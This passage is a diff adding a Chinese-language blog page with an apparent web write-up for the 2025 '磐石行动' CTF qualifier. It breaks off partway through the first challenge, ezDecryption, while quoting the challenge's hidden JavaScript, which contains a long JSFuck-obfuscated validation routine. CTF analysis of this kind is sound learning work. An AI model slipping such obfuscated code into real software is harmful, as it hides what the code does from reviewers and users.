@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>第十届 “磐石行动” 初赛 2025 Web Writeup - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="第十届 “磐石行动” 初赛 2025 Web Writeup"><meta name="keywords" content='Java'>
+  <meta itemprop="name" content="第十届 “磐石行动” 初赛 2025 Web Writeup">
+  <meta itemprop="description" content="第十届 “磐石行动” 初赛 2025 Web Writeup">
+  <meta itemprop="datePublished" content="2025-08-06T23:13:18+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:34:00+08:00">
+  <meta itemprop="wordCount" content="601">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="Java"><meta property="og:url" content="https://sw1mblu3.fun/posts/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="第十届 “磐石行动” 初赛 2025 Web Writeup">
+  <meta property="og:description" content="第十届 “磐石行动” 初赛 2025 Web Writeup">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-06T23:13:18+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:34:00+08:00">
+    <meta property="article:tag" content="Java">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="第十届 “磐石行动” 初赛 2025 Web Writeup" /><meta name="twitter:description" content="第十届 “磐石行动” 初赛 2025 Web Writeup" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup/" title="第十届 “磐石行动” 初赛 2025 Web Writeup - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce/" title="浅析 PHPCMSv9.6.3 上下文逃逸导致RCE" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/%E5%9F%BA%E4%BA%8E-nepctf-2025-jsonpickle-safe-%E6%A8%A1%E5%BC%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E-waf-%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" title="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup/index.md" title="第十届 “磐石行动” 初赛 2025 Web Writeup - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "第十届 “磐石行动” 初赛 2025 Web Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "Java","wordcount":  601 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup\/","datePublished": "2025-08-06T23:13:18+00:00","dateModified": "2026-07-09T18:34:00+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>第十届 “磐石行动” 初赛 2025 Web Writeup</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-08-06T23:13:18Z">6 Aug, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ezdecryption">ezDecryption</a></li>
+    <li><a href="#jaba_ez">jaba_ez</a></li>
+    <li><a href="#ezyaml">ezyaml</a></li>
+    <li><a href="#ez_py">ez_py</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>第十届 “磐石行动” 2025 Web Writeup
+<figure>
+  <img src="70f0f7f5c49c3dc7c656c8127acb0996.png" alt="" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="ezdecryption"><span>ezDecryption</span>
+  <a href="#ezdecryption" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>访问网页，提示需要验证码
+<figure>
+  <img src="file-20250806095432652.png" alt="" loading="lazy"></figure>
+
+查看网页源代码，发现隐藏信息 JS 文件
+<figure>
+  <img src="file-20250806095511399.png" alt="" loading="lazy"></figure>
+
+源代码如下</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">// 系统初始化脚本
+</span></span><span class="line"><span class="cl">(function() {
+</span></span><span class="line"><span class="cl">    const systemConfig = {
+</span></span><span class="line"><span class="cl">        version: &#34;2.0.1&#34;,
+</span></span><span class="line"><span class="cl">        debug: false
+</span></span><span class="line"><span class="cl">    };
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    function initSystem() {
+</span></span><span class="line"><span class="cl">        console.log(&#34;系统初始化完成&#34;);
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        window._sysData = btoa(JSON.stringify(_systemData));
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    initSystem();
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    window._verificationCode = btoa(_0x7e9);
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">})();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 系统功能模块
+</span></span><span class="line"><span class="cl">const systemModule = {
+</span></span><span class="line"><span class="cl">    // 获取系统信息
+</span></span><span class="line"><span class="cl">    getSystemInfo: function() {
+</span></span><span class="line"><span class="cl">        return {
+</span></span><span class="line"><span class="cl">            version: &#34;panshi&#34;,
+</span></span><span class="line"><span class="cl">            status: &#34;active&#34;
+</span></span><span class="line"><span class="cl">        };
+</span></span><span class="line"><span class="cl">    },
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    // 验证功能
+</span></span><span class="line"><span class="cl">    validateCode: function() {
+</span></span><span class="line"><span class="cl">        // 这里包含验证逻辑
+</span></span><span class="line"><span class="cl">        const _0x1 = [][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+!+[]]+(!![]+[])[+[]]])[(![]+[])[+!+[]]+(!![]+[])[+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]](+[![]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+